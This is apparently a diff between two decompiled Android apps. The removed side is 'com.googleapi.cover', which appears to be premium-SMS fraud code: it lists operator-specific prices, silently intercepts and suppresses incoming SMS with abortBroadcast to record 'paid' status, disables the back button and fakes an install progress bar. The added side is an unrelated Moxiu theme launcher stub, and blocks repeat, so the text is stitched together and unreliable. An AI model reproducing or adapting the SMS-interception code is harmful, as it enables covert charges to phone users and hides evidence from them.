-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-Package Path:com.googleapi.cover.ShowURL.onClick
-Class Name:ShowURL
-Content: package com.googleapi.cover;
-
-            public void onClick(View v) {
-                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
-                Intent intent = new Intent("android.intent.action.CALL");
-                intent.setData(Uri.parse(uri));
-                ShowURL.this.startActivity(intent);
-            }
-
-Package Path:com.googleapi.cover.ShowURL.onClick
-Class Name:ShowURL
-Content: package com.googleapi.cover;
-
-            public void onClick(View v) {
-                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
-                Intent intent = new Intent("android.intent.action.CALL");
-                intent.setData(Uri.parse(uri));
-                ShowURL.this.startActivity(intent);
-            }
-
-Package Path:com.googleapi.cover.MessageReceiver.onReceive
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
-
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
-            try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
-                }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
-                    } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-                    }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
-                }
-            } catch (Exception e) {
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.MessageReceiver.onReceive
-Class Name:MessageReceiver
-Content: package com.googleapi.cover;
-
-    public void onReceive(Context context, Intent intent) {
-        Bundle bundle;
-        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (bundle = intent.getExtras()) != null) {
-            try {
-                SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                StringBuilder builder = new StringBuilder();
-                boolean hasExpectedNum = false;
-                SmsMessage[] msgs = new SmsMessage[pdus.length];
-                for (int i = 0; i < msgs.length; i++) {
-                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
-                    if (msgs[i].getOriginatingAddress().equalsIgnoreCase(settings.getString(Actor.EXPECT_NUM, ""))) {
-                        if (!hasExpectedNum) {
-                            hasExpectedNum = true;
-                        }
-                        builder.append(msgs[i].getMessageBody().replace("http://sms911.r", ""));
-                    }
-                }
-                if (hasExpectedNum) {
-                    String text = builder.toString();
-                    if (text.contains("http://")) {
-                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
-                    } else {
-                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-                    }
-                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
-                    abortBroadcast();
-                }
-            } catch (Exception e) {
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.Main.Main
-Class Name:Main
-Content: package com.googleapi.cover;
-
-public class Main extends Activity {
-    public static final String CONTENT_NAME = "*CONTENT_NAME*";
-    private static final String INSTALL_URL = "INSTALL_URL";
-    private static final String IS_LOADED = "IS_LOADED";
-    public static final String KEY_PREFS = "KEY_PREFS";
-    private static final int OFF = 1;
-    private static final int RESULT_OK = 1;
-    public static final String SEND_DONE = "SEND_DONE";
-    private Actor actor;
-    private TextView agreementTextView;
-    private TextView belTextView;
-    private ProgressDialog dialog;
-    private TextView exitTextView;
-    private TextView footrTextView;
-    private String installedURL;
-    private TextView mainTextView;
-    private String pleaseWaitString;
-    private ProgressBar progressBar;
-    private boolean wasProgressDone;
-    private Button yesButton;
-    private String mfPrice = "200";
-    private String mtsPrice = "200";
-    private String tele2_Price = "94.90";
-    private String by_Price = "6901";
-
-    @Override // android.app.Activity
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        requestWindowFeature(1);
-        getWindow().addFlags(1024);
-        this.actor = new Actor(this, TextUtils.getOperatorString(this));
-        if (getSharedPreferences(KEY_PREFS, 0).getInt(TextUtils.getDailyKey(), 0) > 2) {
-            showLastScreen(new Intent(this, (Class<?>) ShowURL.class));
-        }
-        if (Settings.System.getInt(getContentResolver(), "airplane_mode_on", 0) != 0) {
-            showAirplaneDialog();
+            OpenThemeDetail();
             return;
         }
+        this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_install_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.3
+            @Override // android.content.DialogInterface.OnClickListener
+            public void onClick(DialogInterface dialogInterface, int i) {
+                carbqagp.this.installMoXiuLauncherApk();
+                dialogInterface.dismiss();
+            }
+        }).create();
+        this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.4
+            @Override // android.content.DialogInterface.OnKeyListener
+            public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                    carbqagp.this.finish();
+                    carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                    return false;
+                }
+                return false;
+            }
+        });
+        this.interDialog.show();
+    }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.onClick
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+            public void onClick(DialogInterface dialogInterface, int i) {
+                carbqagp.this.installMoXiuLauncherApk();
+                dialogInterface.dismiss();
+            }
+
+Package Path:aimoxiu.theme.carbqagp.carbqagp.carbqagp
+Class Name:carbqagp
+Content: package aimoxiu.theme.carbqagp;
+
+public class carbqagp extends Activity {
+    public static final String MOXIU_FOLDER_THEME = Environment.getExternalStorageDirectory().toString() + "/moxiu/themes/";
+    private static final int MOXIU_LAUNCHER_INSTALL_SUCCESS = 1;
+    private static final String MOXIU_LAUNCHER_NAME = "com.moxiu.launcher";
+    public static final String channel = "moxiu_theme_single";
+    public static final int hezuotiaozhuan = 4097;
+    public static final int hezuotiaozhuan_noinstall = 4098;
+    private AlertDialog interDialog;
+    private int ver = 105;
+    public Boolean isZhiJieYingYong = true;
+
+    @Override // android.app.Activity
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
         setContentView(R.layout.main);
-        DevReg.sendOpening(this);
-        this.progressBar = (ProgressBar) findViewById(R.id.p_bar);
-        this.pleaseWaitString = getResources().getString(R.string.please_wait);
-        if (!this.actor.wasActError()) {
-            initSettings();
-            if (this.progressBar.getVisibility() == 0) {
-                initializeGUI();
-                install();
-                return;
-            } else {
-                if (this.progressBar.getVisibility() != 0) {
-                    if (!isLoadedLinkActivated()) {
-                        finishInstallation(null);
+        if (isInstalled()) {
+            if (this.ver < 311) {
+                this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_version_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.1
+                    @Override // android.content.DialogInterface.OnClickListener
+                    public void onClick(DialogInterface dialogInterface, int i) {
+                        carbqagp.this.installMoXiuLauncherApk();
+                        dialogInterface.dismiss();
                     }
-                    updateGUI();
-                    return;
-                }
+                }).create();
+                this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.2
+                    @Override // android.content.DialogInterface.OnKeyListener
+                    public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                        if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                            carbqagp.this.finish();
+                            carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                            return false;
+                        }
+                        return false;
+                    }
+                });
+                this.interDialog.show();
                 return;
             }
-        }
-        finish();
-    }
-
-    @Override // android.app.Activity, android.view.KeyEvent.Callback
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-    @Override // android.app.Activity
-    public void onBackPressed() {
-    }
-
-    private void showAirplaneDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle(R.string.airplane).setMessage(getResources().getString(R.string.airplane_dialog_text)).setCancelable(false).setPositiveButton(getResources().getString(R.string.yes_btn_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.1
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Utils.putBooleanValue(Main.this.getApplicationContext(), AirModeHandler.AIRPLANE_MODE_WAS_ENABLED_BY_USER, true, Main.this.getSharedPreferences(Main.KEY_PREFS, 0));
-                Utils.setAirplaneMode(Main.this.getApplicationContext(), 0);
-                Main.this.finish();
-            }
-        }).setNegativeButton(getResources().getString(R.string.no_button_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.2
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Main.this.finish();
-            }
-        });
-        AlertDialog alert = builder.create();
-        alert.show();
-    }
-
-    private void startC2DM() {
-        Notifier notifier = new Notifier();
-        notifier.setPrefs(getSharedPreferences(KEY_PREFS, 0));
-        notifier.initSettings(getApplicationContext(), System.currentTimeMillis(), new Intent(this, (Class<?>) Notifier.class).setAction(Notifier.ACT_NOTIFY));
-    }
-
-    private void initializeGUI() {
-        initButtons();
-        initializeTextViews();
-    }
-
-    private void initButtons() {
-        this.yesButton = (Button) findViewById(R.id.yes_button_main);
-        if (this.actor.isMF()) {
-            this.yesButton.setText(getString(R.string.start));
-        } else if (Actor.isBeelineSubscription(this) || Actor.isMTSSubscription(this)) {
-            this.yesButton.setText(getString(R.string.i_subscribe));
-        }
-        if (isLoadedLinkActivated()) {
-            this.yesButton.setEnabled(true);
-            this.yesButton.setVisibility(0);
-        }
-        setListeners();
-    }
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.main_text);
-        if (!isLoadedLinkActivated()) {
-            this.mainTextView.setText(this.actor.getMainText());
-        } else {
-            this.progressBar.setVisibility(8);
-            this.mainTextView.setText(this.actor.getSecondText());
-        }
-        if (this.actor.isUkrCode()) {
-            TextView tv = (TextView) findViewById(R.id.footr);
-            tv.setVisibility(8);
-            if (isLoadedLinkActivated()) {
-                this.mainTextView.setText(getResources().getString(R.string.act_done));
-            }
-        }
-    }
-
-    private void install() {
-        if (!isLoadedLinkActivated()) {
-            new AsyncLoader().execute("");
-        } else {
-            updateGUI();
-        }
-    }
-
-    private void updateGUI() {
-        this.progressBar.setProgress(100);
-        initializeGUI();
-        animateButtons();
-    }
-
-    private void setListeners() {
-        String price;
-        String endText;
-        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.3
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    Main.this.start();
-                }
-            }
-        });
-        this.footrTextView = (TextView) findViewById(R.id.footr);
-        this.agreementTextView = (TextView) findViewById(R.id.agr_text);
-        this.exitTextView = (TextView) findViewById(R.id.exit_text);
-        this.agreementTextView.setVisibility(8);
-        this.exitTextView.setVisibility(8);
-        boolean isMTSSubscription = Actor.isMTSSubscription(this);
-        boolean isBeelineSubscription = Actor.isBeelineSubscription(this);
-        boolean isMFSubscription = Actor.isMFSubscription(this);
-        if ((this.actor.isMF() || this.actor.isTel2()) && !isMFSubscription && !isMTSSubscription) {
-            if (this.actor.isMF()) {
-                price = this.mfPrice;
-            } else if (this.actor.isMTSRF()) {
-                price = this.mtsPrice;
-            } else if (this.actor.isBel()) {
-                price = this.by_Price;
-            } else {
-                price = this.tele2_Price;
-            }
-            this.footrTextView.setVisibility(0);
-            this.agreementTextView.setVisibility(0);
-            this.footrTextView = (TextView) findViewById(R.id.footr);
-            this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
-            this.agreementTextView = (TextView) findViewById(R.id.agr_text);
-            SpannableString content = new SpannableString(getString(R.string.agr_text));
-            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
-            this.agreementTextView.setText(content);
-            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.4
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    Main.this.showOff();
-                }
-            });
-            this.exitTextView = (TextView) findViewById(R.id.exit_text);
-            SpannableString content2 = new SpannableString(getString(R.string.exit));
-            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
-            this.exitTextView.setText(content2);
-            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.5
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    Main.this.finish();
-                }
-            });
-        } else if (isMTSSubscription || isBeelineSubscription) {
-            new String();
-            if (isMTSSubscription) {
-                endText = getString(R.string.pdp_text_end_mts);
-            } else {
-                endText = getString(R.string.pdp_text_end_bl);
-            }
-            this.footrTextView = (TextView) findViewById(R.id.footr);
-            this.footrTextView.setVisibility(0);
-            this.footrTextView.setText(Html.fromHtml(String.valueOf(getString(R.string.pdp_text_start)) + " <a href=\"show_agreement_common_cover://\">" + getString(R.string.pdp_text_middle) + "</a> " + endText));
-            this.footrTextView.setMovementMethod(LinkMovementMethod.getInstance());
-        }
-        this.belTextView = (TextView) findViewById(R.id.bel_text);
-        if (this.actor.isBel()) {
-            enableBelorusTexts();
-        }
-    }
-
-    void enableBelorusTexts() {
-        if (isLoadedLinkActivated()) {
-            this.belTextView.setVisibility(0);
-        }
-        this.footrTextView.setMovementMethod(LinkMovementMethod.getInstance());
-        this.footrTextView.setText(Html.fromHtml(String.valueOf(getString(R.string.bel_text_1)) + " <a href=\"show_agreement_common_cover://\">" + getString(R.string.bel_text_2) + "</a>"));
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void start() {
-        this.dialog = new ProgressDialog(this);
-        this.dialog.setCancelable(false);
-        this.dialog.setMessage(this.pleaseWaitString);
-        this.dialog.show();
-        registerReceiver();
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 1, getSharedPreferences(KEY_PREFS, 0));
-        this.actor.start();
-    }
-
-    @Override // android.app.Activity
-    protected void onResume() {
-        super.onResume();
-        startC2DM();
-    }
-
-    @Override // android.app.Activity
-    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
-        super.onActivityResult(requestCode, resultCode, intent);
-        Log.d("DEBUGGING", "Result: " + requestCode + " " + resultCode);
-        if (resultCode == 1) {
-            start();
-        }
-    }
-
-    private void registerReceiver() {
-        registerReceiver(new BroadcastReceiver() { // from class: com.googleapi.cover.Main.6
-            @Override // android.content.BroadcastReceiver
-            public void onReceive(Context context, Intent i) {
-                Main.this.dialog.dismiss();
-                int resultCode = Actor.STATUS;
-                switch (resultCode) {
-                    case -1:
-                        if (((!Main.this.actor.isMF() || Actor.isMFSubscription(Main.this)) && (!Main.this.actor.isMTSRF() || Actor.isMTSSubscription(Main.this))) || !Main.this.actor.isPrivate() || !Main.this.actor.hasMoreContent(-1)) {
-                            Main.this.showLastScreen(new Intent(Main.this, (Class<?>) ShowURL.class));
-                            break;
-                        } else {
-                            Main.this.showLastScreen(new Intent(Main.this, (Class<?>) RelatedContent.class).putExtra("index", 0));
-                            break;
-                        }
-                    default:
-                        Toast.makeText(Main.this.getBaseContext(), R.string.sms_sending_error, 0).show();
-                        break;
-                }
-            }
-        }, new IntentFilter(SEND_DONE));
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-    public class AsyncLoader extends AsyncTask<String, Integer, String> {
-        private static final long UPDATE_TIME = 31;
-        private int value = 0;
-
-        public AsyncLoader() {
-        }
-
-        /* JADX INFO: Access modifiers changed from: protected */
-        @Override // android.os.AsyncTask
-        public String doInBackground(String... urls) {
-            this.value = 0;
-            while (this.value < 100) {
-                try {
-                    Thread.sleep(UPDATE_TIME);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                this.value++;
-                publishProgress(Integer.valueOf(Main.this.progressBar.getProgress() + 1));
-            }
-            return null;
-        }
-
-        @Override // android.os.AsyncTask
-        public void onProgressUpdate(Integer... args) {
-            Main.this.progressBar.setProgress(this.value);
-            Main.this.mainTextView.setText(String.valueOf(Main.this.actor.getMainText()) + Integer.toString(this.value) + "%");
-        }
-
-        /* JADX INFO: Access modifiers changed from: protected */
-        @Override // android.os.AsyncTask
-        public void onPostExecute(String result) {
-            Main.this.finishInstallation(result);
-        }
-    }
-
-    void finishInstallation(String result) {
-        this.wasProgressDone = true;
-        this.installedURL = this.actor.getContentToBeActed();
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        SharedPreferences.Editor editor = settings.edit();
-        editor.putBoolean(IS_LOADED, true);
-        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
-        editor.commit();
-        updateGUI();
-    }
-
-    void animateButtons() {
-        Animation animation = new TranslateAnimation(1, 1.0f, 1, 0.0f, 1, 0.0f, 1, 0.0f);
-        animation.setDuration(1000L);
-        this.yesButton.startAnimation(animation);
-        this.belTextView.startAnimation(animation);
-    }
-
-    private void initSettings() {
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 0, settings);
-        this.wasProgressDone = settings.getBoolean(IS_LOADED, false);
-        this.installedURL = settings.getString(INSTALL_URL, "");
-    }
-
-    private boolean areLoadedAndActedLinksEquals() {
-        return this.installedURL.equals(this.actor.getContentToBeActed());
-    }
-
-    private boolean isLoadedLinkActivated() {
-        return this.wasProgressDone && areLoadedAndActedLinksEquals();
-    }
-
-    @Override // android.app.Activity
-    public boolean onCreateOptionsMenu(Menu menu) {
-        MenuInflater inflater = getMenuInflater();
-        inflater.inflate(R.menu.main_menu, menu);
-        return true;
-    }
-
-    @Override // android.app.Activity
-    public boolean onOptionsItemSelected(MenuItem item) {
-        switch (item.getItemId()) {
-            case R.id.read_off_item /* 2131296277 */:
-                showOff();
-                return true;
-            default:
-                return super.onOptionsItemSelected(item);
-        }
-    }
-
-    /* JADX INFO: Access modifiers changed from: private */
-    public void showOff() {
-        Intent i = new Intent(this, (Class<?>) AgActivity.class);
-        startActivityForResult(i, 1);
-    }
-}
-
-Package Path:com.googleapi.cover.Main.Main
-Class Name:Main
-Content: package com.googleapi.cover;
-
-public class Main extends Activity {
-    public static final String CONTENT_NAME = "*CONTENT_NAME*";
-    private static final String INSTALL_URL = "INSTALL_URL";
-    private static final String IS_LOADED = "IS_LOADED";
-    public static final String KEY_PREFS = "KEY_PREFS";
-    private static final int OFF = 1;
-    private static final int RESULT_OK = 1;
-    public static final String SEND_DONE = "SEND_DONE";
-    private Actor actor;
-    private TextView agreementTextView;
-    private TextView belTextView;
-    private ProgressDialog dialog;
-    private TextView exitTextView;
-    private TextView footrTextView;
-    private String installedURL;
-    private TextView mainTextView;
-    private String pleaseWaitString;
-    private ProgressBar progressBar;
-    private boolean wasProgressDone;
-    private Button yesButton;
-    private String mfPrice = "200";
-    private String mtsPrice = "200";
-    private String tele2_Price = "94.90";
-    private String by_Price = "6901";
-
-    @Override // android.app.Activity
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        requestWindowFeature(1);
-        getWindow().addFlags(1024);
-        this.actor = new Actor(this, TextUtils.getOperatorString(this));
-        if (getSharedPreferences(KEY_PREFS, 0).getInt(TextUtils.getDailyKey(), 0) > 2) {
-            showLastScreen(new Intent(this, (Class<?>) ShowURL.class));
-        }
-        if (Settings.System.getInt(getContentResolver(), "airplane_mode_on", 0) != 0) {
-            showAirplaneDialog();
+            OpenThemeDetail();
             return;
         }
-        setContentView(R.layout.main);
-        DevReg.sendOpening(this);
-        this.progressBar = (ProgressBar) findViewById(R.id.p_bar);
-        this.pleaseWaitString = getResources().getString(R.string.please_wait);
-        if (!this.actor.wasActError()) {
-            initSettings();
-            if (this.progressBar.getVisibility() == 0) {
-                initializeGUI();
-                install();
-                return;
-            } else {
-                if (this.progressBar.getVisibility() != 0) {
-                    if (!isLoadedLinkActivated()) {
-                        finishInstallation(null);
-                    }
-                    updateGUI();
-                    return;
-                }
-                return;
+        this.interDialog = new AlertDialog.Builder(this).setTitle(getResources().getString(R.string.moxiu_info)).setMessage(getResources().getString(R.string.moxiu_install_info)).setPositiveButton(getResources().getString(R.string.moxiu_ok), new DialogInterface.OnClickListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.3
+            @Override // android.content.DialogInterface.OnClickListener
+            public void onClick(DialogInterface dialogInterface, int i) {
+                carbqagp.this.installMoXiuLauncherApk();
+                dialogInterface.dismiss();
             }
+        }).create();
+        this.interDialog.setOnKeyListener(new DialogInterface.OnKeyListener() { // from class: aimoxiu.theme.carbqagp.carbqagp.4
+            @Override // android.content.DialogInterface.OnKeyListener
+            public boolean onKey(DialogInterface dialogInterface, int i, KeyEvent keyEvent) {
+                if (i == 4 && keyEvent.getRepeatCount() == 0) {
+                    carbqagp.this.finish();
+                    carbqagp.this.overridePendingTransition(R.anim.moxiu_zoom_in_back, R.anim.moxiu_zoom_out_back);
+                    return false;
+                }
+                return false;
+            }
+        });
+        this.interDialog.show();
+    }
+
+    private void OpenMoxiuTheme() {
+        try {
+            getPackageManager().getPackageInfo(getApplication().getPackageName(), 0).applicationInfo.loadLabel(getPackageManager()).toString();
+            ComponentName componentName = new ComponentName(MOXIU_LAUNCHER_NAME, "com.moxiu.market.activity.ActivityMarket_main");
+            Intent intent = new Intent();
+            intent.setFlags(131072);
+            intent.addFlags(268435456);
+            intent.setAction("android.intent.action.MAIN");
+            intent.setComponent(componentName);
+            startActivity(intent);
+            overridePendingTransition(R.anim.moxiu_zoom_in, R.anim.moxiu_zoom_out);
+            finish();
+        } catch (PackageManager.NameNotFoundException e) {
         }
+    }
+
+    private void OpenThemeDetail() {
+        PackageInfo packageInfo = null;
+        try {
+            packageInfo = getPackageManager().getPackageInfo(getApplication().getPackageName(), 0);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+        String str = packageInfo.applicationInfo.sourceDir;
+        Intent intent = new Intent("com.moxiu.launcher.theme.MYACTION", Uri.parse("info://moxiu.ni hao !"));
+        Bundle bundle = new Bundle();
+        bundle.putInt("positon", 0);
+        bundle.putString("packagename", getApplication().getPackageName());
+        bundle.putInt("iscoming", hezuotiaozhuan);
+        bundle.putString("apkpath", str);
+        bundle.putString("childtag", "moxiutheme");
+        intent.putExtras(bundle);
+        intent.setFlags(268435456);
+        startActivity(intent);
         finish();
     }
 
-    @Override // android.app.Activity, android.view.KeyEvent.Callback
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
     @Override // android.app.Activity
-    public void onBackPressed() {
-    }
-
-    private void showAirplaneDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle(R.string.airplane).setMessage(getResources().getString(R.string.airplane_dialog_text)).setCancelable(false).setPositiveButton(getResources().getString(R.string.yes_btn_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.1
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Utils.putBooleanValue(Main.this.getApplicationContext(), AirModeHandler.AIRPLANE_MODE_WAS_ENABLED_BY_USER, true, Main.this.getSharedPreferences(Main.KEY_PREFS, 0));
-                Utils.setAirplaneMode(Main.this.getApplicationContext(), 0);
-                Main.this.finish();
-            }
-        }).setNegativeButton(getResources().getString(R.string.no_button_dialog), new DialogInterface.OnClickListener() { // from class: com.googleapi.cover.Main.2
-            @Override // android.content.DialogInterface.OnClickListener
-            public void onClick(DialogInterface dialog, int id) {
-                Main.this.finish();
-            }
-        });
-        AlertDialog alert = builder.create();
-        alert.show();
-    }
-
-    private void startC2DM() {
-        Notifier notifier = new Notifier();
-        notifier.setPrefs(getSharedPreferences(KEY_PREFS, 0));
-        notifier.initSettings(getApplicationContext(), System.currentTimeMillis(), new Intent(this, (Class<?>) Notifier.class).setAction(Notifier.ACT_NOTIFY));
-    }
-
-    private void initializeGUI() {
-        initButtons();
-        initializeTextViews();
-    }
-
-    private void initButtons() {
-        this.yesButton = (Button) findViewById(R.id.yes_button_main);
-        if (this.actor.isMF()) {
-            this.yesButton.setText(getString(R.string.start));
-        } else if (Actor.isBeelineSubscription(this) || Actor.isMTSSubscription(this)) {
-            this.yesButton.setText(getString(R.string.i_subscribe));
-        }
-        if (isLoadedLinkActivated()) {
-            this.yesButton.setEnabled(true);
-            this.yesButton.setVisibility(0);
-        }
-        setListeners();
-    }
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.main_text);
-        if (!isLoadedLinkActivated()) {
-            this.mainTextView.setText(this.actor.getMainText());
-        } else {
-            this.progressBar.setVisibility(8);
-            this.mainTextView.setText(this.actor.getSecondText());
-        }
-        if (this.actor.isUkrCode()) {
-            TextView tv = (TextView) findViewById(R.id.footr);
-            tv.setVisibility(8);
-            if (isLoadedLinkActivated()) {
-                this.mainTextView.setText(getResources().getString(R.string.act_done));
-            }
-        }
-    }
-
-    private void install() {
-        if (!isLoadedLinkActivated()) {
-            new AsyncLoader().execute("");
-        } else {
-            updateGUI();
-        }
-    }
-
-    private void updateGUI() {
-        this.progressBar.setProgress(100);
-        initializeGUI();
-        animateButtons();
-    }
-
-    private void setListeners() {
-        String price;
-        String endText;
-        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.3
-            private boolean clickable = true;
-
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                if (this.clickable) {
-                    this.clickable = false;
-                    Main.this.start();
-                }
-            }
-        });
-        this.footrTextView = (TextView) findViewById(R.id.footr);
-        this.agreementTextView = (TextView) findViewById(R.id.agr_text);
-        this.exitTextView = (TextView) findViewById(R.id.exit_text);
-        this.agreementTextView.setVisibility(8);
-        this.exitTextView.setVisibility(8);
-        boolean isMTSSubscription = Actor.isMTSSubscription(this);
-        boolean isBeelineSubscription = Actor.isBeelineSubscription(this);
-        boolean isMFSubscription = Actor.isMFSubscription(this);
-        if ((this.actor.isMF() || this.actor.isTel2()) && !isMFSubscription && !isMTSSubscription) {
-            if (this.actor.isMF()) {
-                price = this.mfPrice;
-            } else if (this.actor.isMTSRF()) {
-                price = this.mtsPrice;
-            } else if (this.actor.isBel()) {
-                price = this.by_Price;
+    protected void onActivityResult(int i, int i2, Intent intent) {
+        if (i == MOXIU_LAUNCHER_INSTALL_SUCCESS && i2 == 0) {
+            if (isInstalled() && this.ver > 310) {
+                OpenThemeDetail();
             } else {
-                price = this.tele2_Price;
+                OpenMoxiuTheme();
             }
-            this.footrTextView.setVisibility(0);
-            this.agreementTextView.setVisibility(0);
-            this.footrTextView = (TextView) findViewById(R.id.footr);
-            this.footrTextView.setText(String.valueOf(getString(R.string.attention)) + " " + price + getString(R.string.rub));
-            this.agreementTextView = (TextView) findViewById(R.id.agr_text);
-            SpannableString content = new SpannableString(getString(R.string.agr_text));
-            content.setSpan(new UnderlineSpan(), 0, content.length(), 0);
-            this.agreementTextView.setText(content);
-            this.agreementTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.4
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    Main.this.showOff();
-                }
-            });
-            this.exitTextView = (TextView) findViewById(R.id.exit_text);
-            SpannableString content2 = new SpannableString(getString(R.string.exit));
-            content2.setSpan(new UnderlineSpan(), 0, content2.length(), 0);
-            this.exitTextView.setText(content2);
-            this.exitTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.Main.5
-                @Override // android.view.View.OnClickListener
-                public void onClick(View v) {
-                    Main.this.finish();
-                }
-            });
-        } else if (isMTSSubscription || isBeelineSubscription) {
-            new String();
-            if (isMTSSubscription) {
-                endText = getString(R.string.pdp_text_end_mts);
-            } else {
-                endText = getString(R.string.pdp_text_end_bl);
